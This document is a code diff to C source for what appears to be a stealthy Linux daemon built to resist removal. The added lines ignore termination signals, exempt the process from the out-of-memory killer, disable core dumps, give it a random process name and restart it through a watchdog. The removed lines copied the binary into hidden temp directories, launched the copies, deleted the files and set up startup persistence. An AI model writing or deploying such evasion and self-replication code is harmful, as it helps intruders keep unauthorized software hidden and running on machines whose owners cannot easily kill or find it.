@@ -73,36 +73,33 @@ static void protect_process() {
     setrlimit(RLIMIT_NOFILE, &limit);
     setrlimit(RLIMIT_NPROC, &limit);
     
+    limit.rlim_cur = RLIM_INFINITY;
+    limit.rlim_max = RLIM_INFINITY;
+    setrlimit(RLIMIT_AS, &limit);
+    
     prctl(PR_SET_PDEATHSIG, SIGKILL);
     prctl(PR_SET_DUMPABLE, 0);
+    prctl(PR_SET_NAME, (unsigned long)get_random_name());
     
     int fd = open("/proc/self/oom_score_adj", O_WRONLY);
     if (fd >= 0) {
-        ssize_t bytes_written = 0;
-        size_t total_written = 0;
-        const char *oom_str = "-1000";
-        size_t to_write = 5;
-        
-        while (total_written < to_write) {
-            bytes_written = write(fd, oom_str + total_written, to_write - total_written);
-            if (bytes_written <= 0) {
-                if (errno == EINTR) continue;
-                break;
-            }
-            total_written += bytes_written;
-        }
+        write(fd, "-1000\n", 6);
         close(fd);
     }
     
-    errno = 0;
-    if (setpriority(PRIO_PROCESS, 0, -20) != 0 && errno != 0) {
-    }
+    setpriority(PRIO_PROCESS, 0, -20);
     
-    signal(SIGTERM, SIG_IGN);
-    signal(SIGINT, SIG_IGN);
-    signal(SIGQUIT, SIG_IGN);
-    signal(SIGALRM, SIG_IGN);
-    signal(SIGPIPE, SIG_IGN);
+    struct sigaction sa;
+    sa.sa_handler = SIG_IGN;
+    sigemptyset(&sa.sa_mask);
+    sa.sa_flags = 0;
+    
+    sigaction(SIGTERM, &sa, NULL);
+    sigaction(SIGINT, &sa, NULL);
+    sigaction(SIGQUIT, &sa, NULL);
+    sigaction(SIGPIPE, &sa, NULL);
+    sigaction(SIGUSR1, &sa, NULL);
+    sigaction(SIGUSR2, &sa, NULL);
 }
 
 void* rename_process(void* arg) {
@@ -167,115 +164,57 @@ void overwrite_argv(int argc, char** argv) {
 }
 
 void* watchdog(void* arg) {
-    static int last_spawn_time = 0;
-    static int consecutive_fails = 0;
-    static int last_found_copies = 0;
+    int last_active = time(NULL);
+    char path[PATH_MAX];
+    char exe_path[PATH_MAX];
+    int self_pid = getpid();
+    
+    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1) < 0) {
+        return NULL;
+    }
     
     while (1) {
-        DIR* proc = opendir("/proc");
-        if (!proc) {
-            sleep(3);
+        FILE* f = NULL;
+        char* line = NULL;
+        size_t len = 0;
+        int found = 0;
+        
+        snprintf(path, sizeof(path), "/proc/%d/status", self_pid);
+        f = fopen(path, "r");
+        if (!f) {
+            sleep(5);
             continue;
         }
-
-        struct dirent* ent;
-        int found_copies = 0;
-        static char self_path[PATH_MAX] = {0};
-        ssize_t self_len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
-        if (self_len < 0) {
-            closedir(proc);
-            sleep(3);
-            continue;
-        }
-        self_path[self_len] = '\0';
-
-        pid_t current_pid = getpid();
-        time_t current_time = time(NULL);
-
-        while ((ent = readdir(proc)) != NULL) {
-            if (!isdigit((unsigned char)ent->d_name[0])) continue;
-            pid_t pid = atoi(ent->d_name);
-            if (pid == current_pid) continue;
-            
-            char exe_path[PATH_MAX] = {0};
-            char cmd_path[PATH_MAX] = {0};
-            char path[PATH_MAX] = {0};
-            
-            if (join_path(path, sizeof(path), "/proc", ent->d_name) != 0) continue;
-            
-            if (join_path(cmd_path, sizeof(cmd_path), path, "cmdline") == 0) {
-                FILE *fcmd = fopen(cmd_path, "r");
-                if (fcmd) {
-                    char cmdline[PATH_MAX] = {0};
-                    if (fgets(cmdline, sizeof(cmdline), fcmd) && strstr(cmdline, self_path)) {
-                        found_copies++;
-                    }
-                    fclose(fcmd);
-                }
-            }
-            
-            if (join_path(path, sizeof(path), path, "exe") != 0) continue;
-            ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
-            if (len > 0) {
-                exe_path[len] = '\0';
-                if (strcmp(exe_path, self_path) == 0) {
-                    found_copies++;
-                }
-            }
-        }
-        closedir(proc);
-
-        if (found_copies < last_found_copies) {
-            consecutive_fails = 0;
-        }
-
-        if (found_copies < 3) {
-            char source_path[PATH_MAX] = {0};
-            ssize_t path_len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
-            if (path_len > 0) {
-                source_path[path_len] = '\0';
-                const char* dirs[] = {
-                    "/dev/shm/", "/tmp/", "/var/tmp/", 
-                    "/run/", "/var/run/", "/var/cache/"
-                };
-                
-                int spawn_success = 0;
-                for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
-                    char new_path[PATH_MAX] = {0};
-                    unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
-                    snprintf(new_path, sizeof(new_path), "%s%x", dirs[i], rand_val);
-                    
-                    if (copy_file(source_path, new_path) == 0) {
-                        chmod(new_path, S_IRWXU);
-                        pid_t pid = fork();
-                        if (pid == 0) {
-                            setsid();
-                            if (daemon(0, 0) == 0) {
-                                protect_process();
-                                errno = 0;
-                                if (nice(-20) == -1 && errno != 0) {
-                                }
-                                execl(new_path, new_path, NULL);
-                            }
-                            exit(0);
-                        } else if (pid > 0) {
-                            spawn_success = 1;
-                            consecutive_fails = 0;
-                        }
-                        unlink(new_path);
-                        if (spawn_success) break;
+        
+        while (getline(&line, &len, f) != -1) {
+            if (strstr(line, "VmRSS:")) {
+                long rss;
+                if (sscanf(line, "VmRSS: %ld", &rss) == 1) {
+                    if (rss > 250000) { // 250MB
+                        execl(exe_path, exe_path, NULL);
+                        exit(1);
                     }
                 }
-                
-                if (!spawn_success) {
-                    consecutive_fails++;
-                }
+                found = 1;
+                break;
             }
         }
-
-        last_found_copies = found_copies;
-        sleep(found_copies < 3 ? 3 : 8);
+        
+        if (line) {
+            free(line);
+            line = NULL;
+        }
+        fclose(f);
+        
+        if (time(NULL) - last_active > 300) { // 5 minutes
+            execl(exe_path, exe_path, NULL);
+            exit(1);
+        }
+        
+        last_active = time(NULL);
+        sleep(30);
     }
+    
     return NULL;
 }
 
@@ -398,91 +337,43 @@ void setup_signal_handlers() {
 }
 
 void daemonize(int argc, char** argv) {
-    srand(time(NULL) ^ getpid());
-    protect_process();
+    pid_t pid;
     
-    char source_path[PATH_MAX] = {0};
-    ssize_t len = readlink("/proc/self/exe", source_path, sizeof(source_path)-1);
-    if (len > 0) {
-        source_path[len] = '\0';
-        ensure_startup_persistence(source_path);
-    }
-
-    pid_t pid = fork();
-    if (pid < 0) {
-        exit(EXIT_FAILURE);
-    }
-    if (pid > 0) {
-        exit(EXIT_SUCCESS);
-    }
-
-    setup_signal_handlers();
-    if (setsid() < 0) {
-        exit(EXIT_FAILURE);
-    }
-    signal(SIGHUP, SIG_IGN);
-
     pid = fork();
-    if (pid < 0) {
-        exit(EXIT_FAILURE);
-    }
-    if (pid > 0) {
-        exit(EXIT_SUCCESS);
-    }
-
-    umask(0);
-    if ((chdir("/")) < 0) {
-        exit(EXIT_FAILURE);
-    }
-
-    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++) {
-        close(i);
-    }
-
-    const char* dirs[] = {
-        "/var/tmp/",
-        "/tmp/",
-        "/dev/shm/",
-        "/run/",
-        "/var/run/",
-        "/var/cache/",
-        "/var/log/",
-        "/var/lib/"
-    };
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
     
-    int copies_created = 0;
-    unsigned int seed = time(NULL) ^ getpid();
-
-    for (int i = 0; copies_created < 3 && i < sizeof(dirs) / sizeof(dirs[0]); i++) {
-        char dest_path[PATH_MAX] = {0};
-        const char* name = get_random_name();
-        unsigned int rand_val = (unsigned int)rand() ^ (unsigned int)time(NULL) ^ (unsigned int)getpid();
-        
-        snprintf(dest_path, sizeof(dest_path), "%s%s-%x", dirs[i], name, rand_val);
-        
-        if (access(dest_path, F_OK) == 0) continue;
-        
-        if (copy_file(source_path, dest_path) == 0) {
-            pid_t clone_pid = fork();
-            if (clone_pid == 0) {
-                srand(seed ^ getpid());
-                if (daemon(0, 0) == 0) {
-                    execl(dest_path, name, NULL);
-                }
-                exit(0);
-            }
-            copies_created++;
-            seed = rand();
-            unlink(dest_path);
+    if (setsid() < 0) exit(1);
+    
+    pid = fork();
+    if (pid < 0) exit(1);
+    if (pid > 0) exit(0);
+    
+    chdir("/");
+    umask(0);
+    
+    struct rlimit rlim;
+    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
+        for (int i = 0; i < rlim.rlim_max; i++) {
+            close(i);
         }
     }
-
-    pthread_t rename_thread;
-    pthread_create(&rename_thread, NULL, rename_process, NULL);
+    
+    int fd = open("/dev/null", O_RDWR);
+    if (fd >= 0) {
+        dup2(fd, STDIN_FILENO);
+        dup2(fd, STDOUT_FILENO);
+        dup2(fd, STDERR_FILENO);
+        if (fd > 2) {
+            close(fd);
+        }
+    }
+    
+    protect_process();
     
     pthread_t watchdog_thread;
     pthread_create(&watchdog_thread, NULL, watchdog, NULL);
-    
-    pthread_detach(rename_thread);
     pthread_detach(watchdog_thread);
+    
+    srand(time(NULL) ^ getpid());
 }
